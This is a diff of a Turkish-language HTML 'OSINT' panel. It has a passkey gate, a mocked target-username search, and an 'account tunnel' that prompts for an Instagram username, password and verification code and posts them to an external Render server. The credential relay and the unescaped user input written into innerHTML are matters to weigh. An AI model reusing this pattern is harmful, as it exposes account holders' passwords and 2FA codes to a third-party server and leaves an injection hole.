@@ -25,21 +25,19 @@
         #auth-gate { position: fixed; inset: 0; z-index: 100000; display: flex; align-items: center; justify-content: center; background: #050a15; }
         .login-box { width: 90%; max-width: 400px; padding: 40px; border-radius: 30px; background: var(--glass); border: 2px solid var(--border); text-align: center; backdrop-filter: blur(10px); }
         
-        /* PANEL STRUCTURE */
+        /* PANEL */
         #panel { display: none; height: 100vh; flex-direction: column; opacity: 0; transition: 1s; }
         .top-bar { padding: 20px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
         .main-view { flex: 1; padding: 20px; overflow-y: auto; padding-bottom: 100px; }
         .tab-content { display: none; }
         .tab-content.active { display: block; animation: fadeIn 0.5s; }
 
-        /* UI ELEMENTS */
         .key-input { width: 100%; background: rgba(0,0,0,0.5); border: 1px solid var(--border); padding: 15px; border-radius: 15px; color: var(--accent); text-align: center; margin-bottom: 20px; outline: none; font-family: 'JetBrains Mono'; }
-        .btn-enter { width: 100%; padding: 18px; border-radius: 15px; border: none; background: linear-gradient(45deg, var(--secondary), var(--accent)); color: #fff; font-weight: 800; cursor: pointer; text-transform: uppercase; letter-spacing: 1px; }
+        .btn-enter { width: 100%; padding: 18px; border-radius: 15px; border: none; background: linear-gradient(45deg, var(--secondary), var(--accent)); color: #fff; font-weight: 800; cursor: pointer; text-transform: uppercase; }
         .result-card { background: var(--glass); border-radius: 20px; padding: 20px; border-left: 4px solid var(--accent); margin-bottom: 15px; }
 
-        /* BOTTOM NAV */
         .bottom-nav { position: fixed; bottom: 0; width: 100%; height: 85px; background: rgba(5,10,21,0.98); border-top: 1px solid var(--border); display: flex; justify-content: space-around; align-items: center; padding-bottom: 15px; }
-        .nav-item { color: #5b7a9d; text-align: center; cursor: pointer; flex: 1; font-size: 0.7rem; font-weight: 800; }
+        .nav-item { color: #5b7a9d; text-align: center; cursor: pointer; flex: 1; font-size: 0.7rem; }
         .nav-item.active { color: var(--accent); }
 
         @keyframes spin { to { transform: rotate(360deg); } }
@@ -57,7 +55,7 @@
     <div id="auth-gate">
         <div class="login-box">
             <h1 style="font-family:'Orbitron'; color:var(--accent); margin-bottom:10px;">SUROSINT</h1>
-            <p style="font-size:9px; color:#5b7a9d; margin-bottom:30px; letter-spacing:2px;">VIRTUAL INTERFACE V4.2</p>
+            <p style="font-size:9px; color:#5b7a9d; margin-bottom:30px;">VIRTUAL INTERFACE V4.2</p>
             <input type="password" id="gate-key" class="key-input" placeholder="PASSKEY">
             <button onclick="initSystem()" class="btn-enter">SISTEME SIZ</button>
         </div>
@@ -67,16 +65,16 @@
         <header class="top-bar">
             <div style="display:flex; align-items:center; gap:12px;">
                 <img src="24841.jpg" style="width:38px; border-radius:10px; border:1px solid var(--accent);">
-                <span style="font-weight:900; letter-spacing:1px;">ARCHERA</span>
+                <span style="font-weight:900;">ARCHERA</span>
             </div>
-            <div style="font-family:'JetBrains Mono'; color:var(--accent); font-size:10px;">STORM-V4</div>
+            <div style="color:var(--accent); font-size:10px;">STORM-V4</div>
         </header>
 
         <main class="main-view">
             <section id="search" class="tab-content active">
                 <div class="result-card">
-                    <input type="text" id="target-id" placeholder="@kullanici_adi" class="key-input" style="text-align:left; margin-bottom:10px;">
-                    <button onclick="mockSearch()" class="btn-enter" style="padding:12px;">HEDEFI TARA</button>
+                    <input type="text" id="target-id" placeholder="@username" class="key-input" style="text-align:left; margin-bottom:10px;">
+                    <button onclick="mockSearch()" class="btn-enter" style="padding:12px;">TARA</button>
                 </div>
                 <div id="search-res"></div>
             </section>
@@ -84,7 +82,6 @@
             <section id="admin" class="tab-content">
                 <h3 style="margin-bottom:20px; font-family:'Orbitron'; font-size:1rem;">HESAP TUNELI</h3>
                 <div class="result-card" style="border-left-color: #e1306c;">
-                    <p style="font-size:11px; margin-bottom:15px; color:#5b7a9d;">Instagram hesabini Render sunucusuna baglayarak operasyonu baslat.</p>
                     <button onclick="handleLoginFlow()" class="btn-enter" style="background:#e1306c;">HESAP EKLE</button>
                 </div>
                 <div id="tunnel-status"></div>
@@ -92,8 +89,8 @@
         </main>
 
         <nav class="bottom-nav">
-            <div class="nav-item active" onclick="switchTab('search', this)"><i class="fas fa-crosshairs" style="font-size:1.2rem;"></i><br>OSINT</div>
-            <div class="nav-item" onclick="switchTab('admin', this)"><i class="fas fa-user-shield" style="font-size:1.2rem;"></i><br>ADMIN</div>
+            <div class="nav-item active" onclick="switchTab('search', this)"><i class="fas fa-crosshairs"></i><br>OSINT</div>
+            <div class="nav-item" onclick="switchTab('admin', this)"><i class="fas fa-user-shield"></i><br>ADMIN</div>
         </nav>
     </div>
 
@@ -105,7 +102,7 @@
                 document.getElementById('auth-gate').style.display = 'none';
                 document.getElementById('panel').style.display = 'flex';
                 setTimeout(() => document.getElementById('panel').style.opacity = '1', 50);
-            } else { alert("YETKISIZ ERISIM KANKA."); }
+            } else { alert("YETKISIZ ERISIM."); }
         }
 
         function switchTab(id, el) {
@@ -115,6 +112,9 @@
             el.classList.add('active');
         }
 
+        function showLoader(show) { document.getElementById('loader').style.display = show ? 'flex' : 'none'; }
+
+        // --- ASIL MOTOR BURASI ---
         async function handleLoginFlow() {
             const user = prompt("Instagram Kullanıcı Adı:");
             const pass = prompt("Şifre:");
@@ -126,8 +126,9 @@
                 const response = await fetch(`${RENDER_URL}/api/v4/auth/link`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ username: user, password: pass })
+                    body: JSON.stringify({ "username": user, "password": pass, "verification_code": "" })
                 });
+                
                 const res = await response.json();
                 showLoader(false);
 
@@ -138,7 +139,7 @@
                         const resCode = await fetch(`${RENDER_URL}/api/v4/auth/link`, {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ username: user, password: pass, verification_code: code })
+                            body: JSON.stringify({ "username": user, "password": pass, "verification_code": code })
                         });
                         const final = await resCode.json();
                         showLoader(false);
@@ -148,20 +149,18 @@
                         } else { alert("❌ HATA: " + final.message); }
                     }
                 } else if(res.status === "success") {
-                    alert("✅ GIRIS BASARILI!");
+                    alert("✅ GİRİŞ BAŞARILI!");
                     document.getElementById('tunnel-status').innerHTML = `<div class="result-card"><b>${user}</b>: BAGLI 🔥</div>`;
                 } else {
-                    alert("❌ HATA: " + res.message);
+                    alert("❌ HATA: " + (res.message || "Bilinmeyen Hata"));
                 }
             } catch (e) {
                 showLoader(false);
-                alert("❌ SUNUCU HATASI. Render loglarini kontrol et.");
+                alert("❌ SUNUCU CEVAP VERMEDI.");
             }
         }
 
-        function showLoader(show) { document.getElementById('loader').style.display = show ? 'flex' : 'none'; }
-
-        async function mockSearch() {
+        function mockSearch() {
             const val = document.getElementById('target-id').value;
             if(!val) return;
             document.getElementById('search-res').innerHTML = `<div class="result-card">Hedef taranıyor: ${val}...</div>`;
